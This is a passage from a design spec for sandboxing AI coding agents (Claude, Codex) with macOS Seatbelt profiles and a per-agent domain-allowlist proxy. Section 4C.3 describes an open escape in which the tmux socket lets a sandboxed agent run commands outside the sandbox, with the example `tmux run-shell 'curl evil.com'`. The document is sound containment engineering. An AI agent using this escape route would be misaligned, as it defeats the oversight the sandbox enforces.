not model `sandbox.rawAllow`. rawAllow is the verbatim SBPL escape hatch (§5.1),
so a rawAllow line carrying `file-read*` or `file-write*` can make the live
kernel wider than the resolver predicts; the validator already warns on a
catch-all rawAllow (`(allow default)`, `(allow file-read*)`,
`(allow file-write*)`) for exactly that reason. The one sanctioned rawAllow a
later piece adds is the mandatory root-directory listing `(allow file-read-data
(literal "/"))`, which permits the `readdir` of the root node only; the resolver
does not model it, so `resolvePathAccess("/", "read")` returns `deny` while the
kernel permits that single listing. No other rawAllow line is expected to widen
filesystem access, and any that does is outside the resolver's contract.

## 4B. Codex: disable its built-in sandbox, use ours (Adam's call)

**Decision (Adam, 2026-07-17): a sandboxed codex agent runs codex in its own
"yolo"/no-sandbox mode so codex does NOT double-sandbox, and OUR seatbelt +
proxy is the single enforcement layer.** One mental model, one config surface
(`_all.md` + frontmatter) for both claude and codex agents.

Mechanism — codex's sandbox is set by two flags on its launch line
(`codex-spawn.ts:189/191` spawn, `375/377` resume):
- `-a never` — approval mode (unchanged; don't prompt).
- `-s workspace-write` — codex's OS sandbox. **When `sandbox.enabled: true`,
  change this to `-s danger-full-access`** (codex's no-sandbox mode) so codex
  stops enforcing its own filesystem/network rules.

Then wrap the whole `codex …` launch in `sandbox-exec -f sandbox.sb … codex …`,
exactly like the claude wrapper (§3.3) — with the proxy vars **exported in the
start/resume script** before the launch line, NOT via an `env` wrapper link (same
simplification as §3.3). Result: our profile is the sole authority for both CLIs;
no confusing intersection of two kernel sandboxes.

Why not nest the two sandboxes: two OS sandboxes on one process enforce the
**intersection** of their rules. A path our profile allows but codex's
`workspace-write` forbids would fail with no signal as to which layer blocked it.
`danger-full-access` removes codex's layer so ours is unambiguous.

✅ **Implemented in `src/codex-spawn.ts`:** spawn and resume preserve `-a never`,
select `-s danger-full-access` under our Seatbelt wrapper, export the same proxy
environment, and retain `-s workspace-write` when the per-agent sandbox is off.

✅ **Codex spike items resolved by the shipped phase-5 path (§6):**
1. The installed Codex accepts `-s danger-full-access`; both generated launch
   paths select it only under our wrapper.
2. Codex honors the exported `http(s)_proxy` variables and reaches its allowed
   endpoints through the per-agent proxy; direct egress still fails closed.
3. `danger-full-access` + `-a never` retains non-interactive approval behavior
   and the existing `<&0` TTY handling on spawn and resume.

The installed CLI accepts `danger-full-access`, Codex runs through the per-agent
proxy without reintroducing approvals, and `sandbox.enabled: false` keeps its
existing `-s workspace-write` behavior. The shipped `_all.md` includes
`chatgpt.com` and `api.openai.com`; because proxy apex entries are exact,
subdomains remain denied unless explicitly added.

## 4C. What ELSE runs inside the sandbox (the big gap — from design review)

⚠️ **A Seatbelt profile is inherited by every descendant process.** The agent's
`claude`/`codex` is not the only thing sandboxed — so is **every hook it fires,
every `ib` command it runs, every MCP server, and every process a `Bash` tool
call spawns.** Under `(deny default)`, this is where the design actually bites.
The baseline (§4A.7) and `_all.md` MUST account for all of the following, or a
sandboxed agent is broken in ways that look like Claude bugs.

### 4C.1 The `ib` binary and its write targets (highest impact)

A sandboxed agent shells out to `ib` constantly (hooks + `ib send`/`status`/etc.).
Required in the baseline:
- **`/usr/local/bin/ib`** readable+executable (added to §4A.7).
- **The agent's OWN per-worktree dir is MANDATORY, not "candidate".** The worktree
  is `<agentDir>/repo`, so `meta.json`, `agent.log`, `debug-logs/`, and agent
  state live in `<agentDir>` — a **sibling of** `WORKTREE`, *outside* the
  `WORKTREE` subpath. The agent-status hook's `writeAgentState` writes `meta.json`;
  hooks write `debug-logs/`. Inject `<agentDir>` (which *is*
  `<repoPath>/.ittybitty/agents/<id>`, cf. `ib-commands.ts:370`; the worktree is
  `<agentDir>/repo`) as a runtime `-D` writable root. Since `<agentDir>` contains
  the worktree, this single root subsumes `WORKTREE` — keep both `-D` params for
  clarity or drop the redundant one, but comment the overlap.
- **`~/.itsybitsy/agents/**` must be WRITE-allowed** in the `_all.md` baseline, or
  **`ib send` breaks for every sandboxed agent.** Outboxes deliberately live there
  (`outbox.ts:39-45`, verbatim: moved out of the per-worktree dir precisely so a
  sandboxed codex could reach ANY agent's outbox via one writable root passed to
  `--add-dir`). The exact same lesson transfers 1:1 to seatbelt. (This is the
  second lesson in the codex-roots code; the plan previously used it only for the
  gitdir computation.)
- **`ib list`/`ib look`** read every registered repo's `.ittybitty/agents/*/meta.json`
  (cross-repo reads). Decision: allow-read those trees in the `_all.md` baseline,
  or accept `ib list` degrading inside sandboxed agents. (Recommend read-allow.)
- **`ib new-agent` from a sandboxed manager** needs parent-repo `.ittybitty/`
  mkdir + `.claude/settings.local.json` write — exactly what
  `deriveCodexParentRepoRoots` grants codex today (`ib-commands.ts:4708-4724`).
  Reuse that precedent in the baseline for `canSpawnChildren` types.

### 4C.2 Watchdog spawn inheritance (resolved: tmux server owns the spawn)

The CHILD's watchdog is launched with asynchronous `tmux run-shell -b`, so the
process is a descendant of the already-running, unsandboxed tmux server rather
than of the process invoking `ib new-agent` / `ib resume`. This prevents a
sandboxed manager's Seatbelt profile from being inherited for the watchdog's
whole lifetime. The watchdog's own startup writes its PID to transient state;
the existing injectable spawn override still returns a PID for deterministic
tests and legacy `meta.json` compatibility.

This is preferable to adding an `ib` daemon: tmux already owns agent process
creation, already has the required unsandboxed lifetime, and adds no new
coordinator or recovery protocol. The child's `claude` remains unchanged: tmux
starts `start.sh`, which launches the unsandboxed per-agent proxy and wraps only
Claude with that child's Seatbelt profile. Prompt-summary generation is routed
through the same tmux-server helper. Workspace-trust automation issues tmux
client commands rather than owning a long-lived child process, so it remains
invoker-side.

✅ **Implemented in `src/ib-commands.ts` (`spawnHelperViaTmuxServer`) for new
and resumed watchdogs, and for prompt-summary generation.** The final command is
`tmux run-shell -b 'cd <cwd> && exec …'`: cwd is set with a quoted `cd` prefix,
not `run-shell -c`, to remain compatible with tmux releases predating that flag.
The watchdog records its authoritative PID in transient state; test overrides
retain the direct PID return used by deterministic tests and legacy meta.

### 4C.3 tmux socket = sandbox escape (accepted shipped limitation)

Anything that can write the tmux socket (`/private/tmp/tmux-<uid>/`) can
`tmux run-shell '<anything>'`, which executes as a child of the **unsandboxed**
tmux server — bypassing the kernel network deny wholesale
(`tmux run-shell 'curl evil.com'`). The candidate baseline grants `/private/tmp`
read+write, so **this hole is open by default.** Managers genuinely need tmux
(`ib new-agent` creates sessions); **workers do NOT** — `ib send` only appends to
outbox files (delivery happens later, recipient-side, outside the sandbox).
**Recommendation:** deny the tmux socket path for non-spawning types; document the
escape for manager types as an accepted limitation. Do NOT blanket-allow
`/private/tmp` — scope it (e.g. allow the specific temp needs, deny the tmux
socket subpath).

**Shipped state:** `_all.md` still grants `/private/tmp` read+write, so the
escape remains open to sandboxed agents. The scoping recommendation above is a
future hardening item, not a claim about current isolation.

### 4C.4 MCP servers

stdio MCP servers are `claude` children → sandboxed. They need their interpreters
(`node`/`bun`/`uv` — `~/.bun`, `~/.nvm`, NOT in the candidate baseline), their
config files, and their **own network** (an MCP server contacting a
non-allowlisted host fails; HTTP/SSE MCP servers too — their traffic falls under
the same domain allowlist). Compatibility testing should boot any configured MCP
server and its type must add interpreter paths/domains not already in `_all.md`.
MCP network egress is subject to the same domain allowlist.

### 4C.5 Realistic isolation story (set expectations in §1)

Once 4C.1's requirements land (`~/.itsybitsy/agents/**` write, agents-dir reads,
parent-repo `.ittybitty`, `/usr/local/bin`, `~/.claude` write, tmux socket for
managers), the **kernel layer cannot distinguish "`ib` writing an outbox" from
"the agent writing an outbox"** — Seatbelt is per-path, not per-binary. The honest
isolation story: **kernel = coarse walls + network deny; hook (`agent-path.ts`) =
fine-grained cross-agent etiquette.** Still a big win over today (kernel-blocked
secrets + a real domain allowlist), but §1 should not oversell worker-vs-worker
filesystem isolation.

## 5. Shipped components

### 5.1 Profile generator — `src/sandbox.ts`

Pure function: `(SandboxConfig, SandboxProfileParams) → string`
producing the `.sb` text. Writes `sandbox.sb` into the agent dir next to
`start.sh`/`meta.json`. **⚠️ Deny-by-default (Model B) — the profile skeleton is
`(deny default)`, the INVERSE of the reference's `(allow default)`.** SBPL uses
last-matching-rule-wins, so the structure is: deny everything → emit the single
specificity-sorted config+runtime table → emit raw rules → re-deny the config
`deny` holes last (so deny wins):

**⚠️ ZERO baked-in static permissions (Adam's call, 2026-07-18).** The generator
contains no static baseline allow. It is a pure translator: `(deny default)` +
the sorted runtime-derived parameter roots and merged `.md` path entries + the
raw rules + the config `deny` list last. If claude needs the
`allowRead: ["/"]` root entry to
boot, **that line comes from `_all.md`, not from code** — visible and user-owned,
like every other baseline entry (§4A.7). Nothing is assumed; everything is tested
and then written into a `.md` by the user. This means the derived spike baseline
(findings §4.2) becomes the **initial `_all.md` content**, NOT a generator constant.

```
(version 1)
(deny default)                                   ;; unconditional deny floor

;; ---- one table: authored paths + resolved runtime roots, sorted by §4A.8 ----
;; A read row always carries an explicit write deny:
(allow file-read* (subpath "/read-root"))
(deny  file-write* (subpath "/read-root"))
;; A write row grants both operations:
(allow file-read*  (subpath (param "AGENTDIR")))
(allow file-write* (subpath (param "AGENTDIR")))
;; REPOAGENTS is a read runtime row, so it also emits a write deny. Glob rows
;; use (regex #"…"); unsafe plain strings use sorted-position -D names.

;; syscall / network rules — emitted verbatim from merged sandbox.rawAllow

;; config deny list LAST so it wins over every allow above (§4A.0):
(deny file-read*  (subpath (param "DENY_0")) (regex #"…") ...)
(deny file-write* (subpath (param "DENY_0")) (regex #"…") ...)
```

**✅ RESOLVED — option A (Adam, 2026-07-18): ALL holes live in the `.md`, raw-SBPL
included.** The spike-working profile needs non-filesystem rules too — syscall
grants (`process*`, `sysctl-read`, `file-read-metadata`, `file-ioctl`, `mach-lookup`,
`signal`) and the network block (`(deny network*)` + the `localhost`/`mDNSResponder`
holes that make the proxy the only exit). Adam's rule is **zero baked-in anything**
and **every hole visible in the `.md`**, so these are NOT hardcoded — a new
`sandbox.rawAllow` list carries them verbatim in `_all.md`:

```yaml
sandbox:
  rawAllow:
    - "(allow process*)"
    - "(allow mach-lookup)"
    - "(allow file-read-metadata)"
    - "(deny network*)"
    - "(allow network-outbound (remote ip \"localhost:*\"))"
    - "(allow network-outbound (literal \"/private/var/run/mDNSResponder\"))"
    # …the full minimal set the phase-1.5 verification derives…
```

Beyond the runtime-root rows sorted into the same table, the generator emits
**only** `(version 1)`, `(deny default)`, and the merged
`allowRead`/`allowWrite` (each → a read decision plus a write decision) + the merged
`rawAllow` lines verbatim + the config `deny` list last. `domains` is written
separately to the per-agent proxy allowlist, not emitted into SBPL. The generator
contains no static baseline allow of its own — not even the network block. Every
non-runtime **allow** is a line the user can read in a `.md`.

✅ **Implemented by `generateProfile`, `sandboxProfileParameterValues`, and
`validateSandboxFrontmatter` in `src/sandbox.ts`.**

Notes on `rawAllow`:
- It **unions** across the `.md` chain like the other lists (§4 decision 5); a type
  can add syscalls it needs, `_all.md` carries the shared floor.
- Validation is limited (it's raw SBPL) — at minimum reject entries that don't
  parse as a balanced `(...)` s-expression, and lint-warn on `(allow default)` /
  `(allow file* )`-style catch-alls that would defeat Model B. Full SBPL validation
  is out of scope; the profile-compile precondition (§5.5) catches malformed rules
  by failing the spawn (fail-hard).
- Ordering: `rawAllow` lines are emitted in the allow section (before the config
  `deny` list) so config denies still win. A `rawAllow` `(deny …)` line (e.g.
  `(deny network*)`) is fine — SBPL last-match-wins handles the localhost re-allow
  that follows it, exactly as the reference profile does.

Runtime roots always use `-D` params. Configured subpaths that are safe SBPL
string literals stay inspectable inline; any containing quotes, backslashes,
newlines, or carriage returns falls back to a generated `-D` param, while NUL is
rejected. Glob regexes are escaped and anchored. `sandboxExecShellPrefix`
shell-quotes every definition.
This is unit-testable in isolation (`bun test`), no spawn required.

**⚠️ Spike gotchas (`docs/SANDBOX-SPIKE-FINDINGS.md §7`):**
1. **`(allow file-read* (literal "/"))` is MANDATORY + path-irreducible (VERIFIED,
   phase-1.5).** claude needs the root-dir node read to boot; without it, **SIGABRT
   with ZERO output** (aborts before logger init). The verification proved *why*:
   it's the **Bun/Node runtime** (plain `node` SIGABRTs identically), doing a
   `readdir`/`opendir` of the `/` **node itself** — not claude logic, not a `stat`
   (`file-read-metadata` is granted yet it still aborts), and **no set of top-level
   child-allows substitutes** (granting every child but not `/` still aborts).
   `(literal "/")` is already the narrowest PATH form. The ONLY tightening is the
   **op-class**: `(allow file-read-data (literal "/"))` boots (root *listing* only,
   not the whole tree) — a real isolation win, but it can't be expressed in the plain
   path grammar, so it needs a **generator special-case for the `"/"` entry** (or a
   `rawAllow` line). Per Adam's zero-baked-in rule the *permission* still lives in
   `_all.md` (`allowRead: ["/"]`); only the op-class narrowing is a generator detail.
   Left as `"/"` for correctness; the `file-read-data` tightening is a documented
   optional refinement (§8 gap).
2. **A missing READ path → silent SIGABRT/exit-null.** Treat any such failure under
   a new profile as "a read path is missing," and **bisect** (see below).
3. **Harvest by PROFILE BISECTION, not the unified log.** The spike proved the
   §6.1b unified-log method does NOT work for a `sandbox-exec` custom-profile
   process on modern macOS: `(with report)` won't even compile ("report modifier
   does not apply to deny action"), and our process's denials never appear in
   `log show` (only App-Sandbox daemons do). Instead: start `(allow file-read*)`,
   narrow region-by-region (or start narrow, widen) — flip one region, re-run.
4. **Binary paths are install-specific** — `claude`/`node`/`bun`/`ib`/`git` are NOT
   at `/usr/local/bin` on every box (spike box: `~/.local/bin`, `/opt/homebrew/bin`,
   `~/.bun/bin`, dev checkout). The shipped zero-static-baseline design leaves
   these roots in `_all.md`; the generator does not hardcode or discover them.

The concrete `_all.md` read/write baseline the spike derived is in
`docs/SANDBOX-SPIKE-FINDINGS.md §4.2` — use it as the starting `_all.md`, then
re-verify exact paths on the target install (Claude-version/layout-dependent).

### 5.2 Domain proxy — `src/sandbox-proxy.ts` + lifecycle

- **Decided: one proxy PER AGENT** (Adam). Each agent gets its own proxy on an
  allocated port; that port is baked into the agent's `http(s)_proxy` env and
  recorded in `meta.json`. Attribution is trivial (the proxy enforces exactly one
  agent's merged domain allowlist). Lifecycle tied to the agent: started by
  `start.sh`/`resume.sh` before the CLI launch, killed in `teardownAgent`. The
  allowlist is the merged `sandbox.domains` (`_all.md` ∪ type), read from
  a per-agent file (e.g. `agentDir/sandbox-domains.txt`) so it's inspectable.
- **Decided: Bun implementation** (`Bun.serve` / raw TCP for CONNECT), not a
  vendored `proxy.py` — the `ib` binary is self-contained (`bun build --compile`)
  and a Python dep would break that. Allowlist-based (deny unless the CONNECT host
  matches a `domains` entry, with `*.`-subdomain support).
- Proxy must be reachable at `localhost:PORT` from inside the sandbox (the
  seatbelt profile already allows `localhost:*` outbound, and the proxy binds
  localhost — inside the sandbox's allowed set).
- **Matching semantics (specify + test, don't leave implicit):**
  - Apex vs subdomain: an entry `github.com` matches `github.com` **only**;
    subdomains require an explicit `*.github.com` (or list both). This exact-apex
    behavior is implemented and tested — there is no implicit subtree match.
  - `*.x.com` matches one or more labels (`a.x.com` and `a.b.x.com`) but not the
    apex `x.com`; list the apex separately when both are required.
  - CONNECT ports: allow 443/80 only by default (the proxy only needs to gate TLS
    tunnels + plain HTTP); reject other ports.
  - **IP-literal CONNECT → deny** (an IP bypasses domain semantics entirely).
  - Case-insensitive host compare; handle punycode/IDN.
- **Robustness / lifecycle (prior art: pane-child SIGHUPs, tmux spawn-storm):**
  - Spawn the proxy **detached/unref'd** so pane churn can't SIGHUP it; if the
    proxy dies while `claude` lives, the agent is fully offline (kernel blocks
    direct egress) with no self-recovery — give the **watchdog a proxy
    health-check + restart duty**.
  - Natural exit: an agent whose `start.sh` simply ends (claude exits) does NOT go
    through `teardownAgent`, so `start.sh` needs an **EXIT trap** to kill its proxy
    (not only the `teardownAgent` path).
  - Resume: do NOT trust the persisted port — **reallocate** a fresh port, rewrite
    `meta.json`, regenerate the env. (Port is NOT stable across resume.)

✅ **Implemented in `src/sandbox-proxy.ts`, `src/ib-commands.ts`, and
`src/watchdog.ts`:** the per-agent Bun raw-TCP proxy is detached, has an actual
bind/ready health check, is cleaned up by both the script EXIT trap and agent
teardown, gets a fresh port on resume, and is health-checked/restarted by the
watchdog. `chatgpt.com` is intentionally an exact-apex entry; if Codex moves an
endpoint to a subdomain it will fail closed until `_all.md` adds that apex or a
matching wildcard. This is a baseline watch item, not implicit proxy behavior.

### 5.3 Wiring

- `AgentType.sandbox` field + parse + validate + merge (`agent-types.ts`).
- `newAgent`: resolve config, compute writable roots (reuse codex's git-common-
  dir logic), generate `sandbox.sb`, allocate proxy port, persist a `sandbox`
  block + `sandbox_proxy_port` to `meta.json` (`ib-commands.ts` ~4525-4547).
- **`AgentMeta` interface + coercion** (`src/agents.ts:50-92` interface,
  `readAgentMeta` ~:975-981 coercion): add the sandbox field to **both**.
  Persisting at spawn is **mandatory** because **resume re-derives model/effort
  from `meta.json`, not the `.md`** (`ib-commands.ts:1289/1317`). If sandbox
  config lived only in the type file, a resumed agent would silently lose (or
  pick up a changed) sandbox after the `.md` is edited. Follow the `effort`
  persistence convention (`effort || null` at `:4539`).
- `start.sh` / `resume.sh` builders: when `meta.sandbox.enabled`, wrap the
  `claude` launch (both setsid + fallback branches) and start the proxy first.
- `teardownAgent` (`ib-commands.ts:365` area): kill the proxy, free the port.
- Codex branch (`codex-spawn.ts`): in v1, flip `-s workspace-write` →
  `-s danger-full-access` and apply the same seatbelt + proxy env/domain wrap as
  claude (§4B) — codex filesystem is covered by OUR profile, not `workspace-write`.
  This lands in phase 5 (codex parity), not "maybe later". **The intended home for
  the codex network toggle already exists:** `src/codex-config.ts:278` has a
  comment "Revisit when we add per-agent-type capability gating" directly above the
  `network_access = true` line (`:279`).

✅ **Implemented across `src/agent-types.ts`, `src/agents.ts`,
`src/ib-commands.ts`, and `src/codex-spawn.ts`.** Resolved meta is frozen for
resume parity; disabled/absent remains the legacy unsandboxed-Claude and
workspace-write-Codex behavior.

### 5.4 Hooks awareness

- `session-start.ts`: inject a note into the agent's system prompt telling it
  it's sandboxed and which domains/paths are allowed, so it doesn't waste turns
  fighting `EPERM`s it can't fix (mirrors how permissions are surfaced).
- `permission-denied.ts` / `agent-path.ts`: when a denial is actually a sandbox
  kernel block (not a hook block), the error text differs — make sure the
  agent's guidance distinguishes "ask your manager for permission" (hook) from
  "this is kernel-blocked, it can't be granted at runtime" (sandbox). A sandbox
  denial can't be relaxed without a respawn (profile is fixed at exec).
- `ib watch`/dashboard: ✅ phase 6 shows a 🔒 indicator for sandboxed agents in
  the selected-agent info panel.

**Shipped/current state:** the hook-awareness items above remain follow-up
guidance; phases 2–5 did not change hook prompts or runtime permission guidance.
Phase 6 adds the purely presentational lock to `src/tui/info-panel.ts`, where
existing truncation makes it safe without changing sidebar width math.

### 5.5 Fail-hard when the sandbox can't be established (Adam's call)

When `sandbox.enabled: true`, the agent **must not start** unless the sandbox is
fully in place. There is no unsandboxed fallback. Preconditions checked at spawn
(and resume), each of which aborts on failure:

- `sandbox-exec` is present and the OS is macOS (else: platform can't sandbox).
- The generated `sandbox.sb` compiles (dry-run / lint the profile before launch).
- The per-agent proxy binds its port successfully.
- (codex) the `-s danger-full-access` flip + proxy env are applied.
- On resume, metadata for an enabled sandbox includes the frozen top-level
  `paths` block. Enabled metadata written before the `paths:` split is refused;
  it is never interpreted as an empty filesystem allowlist.

On any failure, the spawn/resume path must:
1. **Not exec claude/codex at all** — never a partial or unsandboxed launch.
2. **Log a meaningful, specific error to the agent's `agent.log`** (which
   precondition failed, e.g. "sandbox refused: sandbox.sb failed to compile at
   line N" / "proxy could not bind port P" / "sandbox-exec not found (macOS
   only)").
3. **Surface a clear error to the user** — spawn returns non-zero with an
   explanation; the agent shows as failed-to-start with the reason, not silently
   missing. Mirror the existing spawn-failure surfacing (`newAgent` error paths).

This is the whole point of the feature: an agent that believes it is sandboxed
but isn't is the one outcome we refuse to permit. Wire the precondition checks
into `newAgent` (spawn) and the resume path **before** `start.sh`/`resume.sh` are
written/executed, so nothing launches on a failed precondition.

✅ **Implemented in `src/ib-commands.ts` (`prepareSandbox`):** macOS and
`sandbox-exec` presence are checked, the generated profile is compile-dry-run
with the real `sandbox-exec -f … /usr/bin/true`, and the proxy port is bind-tested
before launch. The generated script performs a second bind/ready check to close
the allocation race. Any failure aborts before Claude/Codex exec; Codex builders
also fail if either shared sandbox prefix is missing.

The resume compatibility guard runs before profile or proxy preparation. When
an enabled legacy `meta.json` has no `paths` block, resume logs a specific
fail-hard error and returns non-zero. The agent remains stopped, no `sandbox.sb`
is written, and no proxy is started. Respawning the agent creates current
metadata with the frozen paths policy.

## 6. Build phases

1. **Spike (blocking) — ✅ COMPLETE (2026-07-18), BOTH gates GO.** Full results in
   `docs/SANDBOX-SPIKE-FINDINGS.md`. Headlines: exec-in-place confirmed (PID/watchdog
   unchanged); Claude Code boots under `(deny default)` with a **tractable** allowlist
   (no `(allow default)` fallback needed — Model B validated on real hardware);
   claude honors `HTTPS_PROXY` natively (`NODE_OPTIONS` dropped); minimal domain
   allowlist = `api.anthropic.com` + `*.anthropic.com`; the derived `_all.md`
   baseline is in findings §4.2. The checklist below is preserved as the record;
   the two ⚠️-corrected items reflect what the spike actually found.
   - **(1a) Plumbing:** wrap one real claude spawn in `sandbox-exec -f` by hand;
     confirm (a) claude starts, (b) `$!`/`pgrep` PID discovery + watchdog still
     work (§3.3), (c) git ops in the worktree succeed, (d) `api.anthropic.com`
     reachable only through the proxy. ⚠️ **PID check must assert the discovered
     pid's actual `comm`/argv0 is `claude` — not merely that `pgrep -f claude`
     returns *a* pid** (G-4). `pgrep -P <panePid> -f claude` (`agent-lifecycle.ts:510`)
     matches on the full cmdline, and the `sandbox-exec` wrapper's argv also
     contains "claude"; so if sandbox-exec did NOT exec-in-place, discovery would
     look green while `kill`/`wait` target the wrapper instead of claude. Verify
     the pid *is* claude. **If PID discovery targets the wrong process, the design
     changes.**
   - **(1b) Boot Claude under `(deny default)`:** THE hard one for Model B.
     Start from the reference's `(allow default)` to prove plumbing, then invert
     to `(deny default)` + baseline and iteratively add the minimal allows until
     claude runs clean. ⚠️ **CORRECTION from the spike:** harvest by **PROFILE
     BISECTION**, NOT the unified log — the spike proved `(with report)` won't
     compile and a `sandbox-exec` process's denials never appear in `log show` on
     modern macOS (§5.1 gotcha 3). ✅ **RESULT: boots under `(deny default)` — no
     fallback needed.** The output of this spike IS the initial `_all.md`
     filesystem + domain baseline (§4A.7 / findings §4.2).
     **Aim the iteration — pre-warned likely boot-blockers, test each:**
     - **Keychain/creds** (likely THE blocker): macOS Claude Code stores OAuth in
       the Keychain → needs `securityd` mach-lookup + `~/Library/Keychains` reads.
     - **`~/.claude` must be WRITABLE** (transcripts/history/statsig/todos) — fixed
       in §4A.7.
     - **`/dev`**: `null`, `urandom`, `tty`, and the tmux pane pty (`/dev/ttysNNN`
       — claude is a TUI; no pty file-read*/write* = instant death) + `/usr/share/terminfo`.
     - **`/private/tmp` not `/tmp`** (canonical-path matching) — fixed in §4A.7.
     - ✅ **`NODE_OPTIONS` — DEAD ITEM, do not add.** The spike confirmed claude
       honors `HTTPS_PROXY` natively; `--use-env-proxy` is unnecessary and leaks
       into node children. Removed from the plan.
     - **Claude Code's OWN Bash sandbox mode** already wraps tool commands in
       `sandbox-exec` — nested `sandbox_init` inside our deny-default profile is
       untested; verify it doesn't fail/confusingly-intersect.
     - **git**: `~/.gitconfig` read (commits fail without user.name/email), the
       `osxkeychain` credential helper (mach). Note SSH remotes CANNOT work (ssh
       ignores `http_proxy`; port-22 egress is kernel-blocked) — fine for local
       branches, but document it.
     - **`~/.claude.json`** (G-1) — the top-level FILE, a *sibling* of `~/.claude/`,
       NOT covered by `~/.claude/**`. Claude Code reads/writes it at startup
       (oauth/account, project trust, onboarding) → likely boot-blocker. Baseline
       must allow the file read+write.
     - **Dev toolchain / repo gate** (G-2) — every agent's gate here is `bun test` +
       `bunx tsc`. Needs `~/.bun` read+write (cache) and `registry.npmjs.org`
       through the proxy (`bunx`/`bun install`). Spike must **run the repo's real
       build/test loop under the profile**, not just boot claude.
     - **`~/.itsybitsy/**` reads** (G-3) — running `ib` needs more than the
       `agents/**` write: `agent-types/*.md` (new-agent re-parses types),
       `config.json`, the repo registry, and the watch-log append inside
       `newAgent` (`ib-commands.ts:5216`). Simplest baseline: read `~/.itsybitsy/**`
       + write `~/.itsybitsy/agents/**` (+ the watch log).
     - **`ib` smoke test under the profile:** `ib send` / `ib list` / (for managers)
       `ib new-agent` must succeed — validates §4C.1 baseline paths.
     - **MCP server**: boot an agent with a real MCP server configured (§4C.4) —
       needs interpreter paths + its own allowlisted egress.
     - **codex** (§4B): `~/.codex` (`auth.json`, `config.toml`) read+write.
1.5. **Verify the minimal baseline — ✅ COMPLETE (2026-07-18), NOTHING assumed.**
   Result: `docs/SANDBOX-BASELINE-MINIMAL.md` — every rule bisection-minimized against
   real claude; final block validated 5/5 (boot via proxy + `tsc` + `test` + `ib
   list`/`status`). Verdicts: `/` is MANDATORY + path-irreducible (Bun/Node runtime
   reads the root node; op-class narrowable to `file-read-data`); minimal syscalls =
   `process*`/`sysctl-read`/`mach-lookup`/`file-read-metadata` (dropped `signal`+
   `file-ioctl`); network floor = `(deny network*)` + `localhost:*` outbound (2 lines);
   home read collapses to 5 dotdirs + 2 files once `AGENTDIR`/`GITDIR` are injected
   READ+write; new `-D` param `REPOAGENTS` for `ib status`. The paste-ready `_all.md`
   block (§(e)) is in the real `allowRead`/`allowWrite`/`deny`/`rawAllow`/`domains`
   schema. Honest non-minimized items (TUI/MCP/codex, dylib-exact reads, `/` op-class)
   → phase-2 backlog.
2. **Pure filesystem/config foundation + validation — ✅ MERGED (2026-07-19;
   `51037bb`, `f902add`).** `src/sandbox.ts` generator, flat schema,
   union+OR inheritance, glob/canonicalization/injection defenses, T-2 validator,
   and pure tests. The original R2 constraint was honored: this foundation did
   not enable a live sandbox before proxy wiring landed.
2b+3. **Fail-hard spawn/resume wiring + per-agent network proxy — ✅ MERGED
   (2026-07-19; `fff8803`, `e2cd1bb`, `2b8d619`, `6d63510`, `dc5746c`).** This
   includes resolved-meta persistence, real `sandbox-exec` compile dry-run,
   proxy start/resume/teardown/EXIT lifecycle, watchdog proxy recovery, the
   disabled `_all.md` baseline, and the Claude 2.1.215 domain addition. The final
   §4C.2 choice is tmux-server-owned `run-shell -b` with a quoted `cd` prefix,
   not an `ib` daemon and not the newer tmux `-c` flag.
4. **SPEC/docs sync — 🚧 IN PROGRESS (this change).** Reconcile the planning
   language, shipped baseline/domain additions, watchdog decision, and phase
   status without changing the historical rationale. The spike and minimal
   baseline findings documents remain immutable context.
5. **Codex parity — ✅ MERGED (2026-07-19; `b7ba36b`, `0eca1db`).** Both launch
   paths use `-s danger-full-access` + the shared Seatbelt/proxy wrap when enabled,
   preserve `-a never`, and use `workspace-write` when disabled.
6. **Dashboard indicator — 🚧 IMPLEMENTED IN THIS CHANGE, AWAITING MERGE.** The
   selected-agent info panel shows `🔒 Sandboxed` only when
   `meta.sandbox?.enabled === true`; the width-sensitive sidebar is unchanged.
   Focused true/false/absent render coverage is included.

Each phase: `bun test` green + `bunx tsc --noEmit` clean (CLAUDE.md gate), then
a review cycle (2 worker reviewers) before merge.

## 7. Decisions and resolved questions

**RESOLVED (Adam, 2026-07-17):**
- ✅ **Enforcement model → Model B (deny-by-default allowlist).** Agent sees only
  what allow lists permit, minus anything a `deny` rule matches (§4A.0). Fully-open
  is explicit-only (`allowRead: ["/"]`).
- ✅ **Baseline location → everything in `_all.md`** (§4A.7, §4 decision 3). Static
  filesystem paths AND all required domains are listed explicitly in `_all.md`;
  built out empirically as we experiment — **no code constant, do not
  over-engineer**. Only `AGENTDIR`, `WORKTREE`, `GITDIR`, and `REPOAGENTS` are
  runtime-injected as `-D` params.
- ✅ **Proxy topology → one proxy PER AGENT** (§5.2). Port recorded in meta.json;
  lifecycle tied to the agent (started by start.sh/resume.sh, killed in teardown).
  Trivial attribution, worth the N small processes.
- ✅ **Proxy implementation → Bun** (`Bun.serve`/raw TCP), not vendored `proxy.py`
  — keeps the `ib` binary self-contained.
- ✅ **Codex → disable its built-in sandbox, use ours** (§4B). `-s workspace-write`
  → `-s danger-full-access` when `sandbox.enabled`, then wrap in our sandbox-exec
  + proxy. Single enforcement layer for both CLIs. Network layer applies to codex
  in v1 (not deferred).
- ✅ **Failure mode → FAIL HARD, never start unsandboxed.** If `sandbox.enabled:
  true` and the sandbox can't be established (`sandbox-exec` missing, profile
  won't compile, proxy won't bind), **do NOT start the agent.** Enabled legacy
  resume metadata with no frozen `paths` block is also refused rather than
  generating an empty-list profile. Fail hard: log a
  meaningful error to the agent's `agent.log` and surface a clear error message to
  the user (spawn returns non-zero with an explanation). The legacy agent stays
  stopped, with no profile written and no proxy started. An agent that believes
  it is sandboxed but isn't is the exact case we refuse to allow. See §5.5.
- ✅ **Inheritance → union (sum of all `.md` files).** Final permissions = the
  union of every layer's lists (`_all.md` ∪ `_non_coordinator.md` ∪ inherits ∪
  leaf), for `paths.allowRead`/`allowWrite`/`deny` and
  `sandbox.rawAllow`/`domains`. Exact duplicates dedupe within a list at merge
  time. The scalar `sandbox.enabled` uses OR-merge (any layer `true` wins).
- ✅ **Top-level `paths:` split (Adam, 2026-09-02).** `sandbox:` contains only
  `enabled`, `rawAllow`, and `domains`; filesystem policy is the separate
  `paths:` block. Old path keys under `sandbox:` are rejected with migration
  guidance.
- ✅ **Write implies read (Adam, 2026-09-02).** Every `allowWrite` matcher emits
  both read and write rules. An exact canonical tie across the read/write lists
  resolves to write; different cross-list globs with the same literal prefix
  are invalid. Deny remains last and wins.
- ✅ **Most-specific entry wins (Adam, 2026-09-02).** After absolute config
  denies win, the deepest matching entry across both allow lists and all runtime
  roots decides. The shared total key is literal-prefix segment depth, plain
  before glob, canonical lexical string, then read before write. Runtime roots
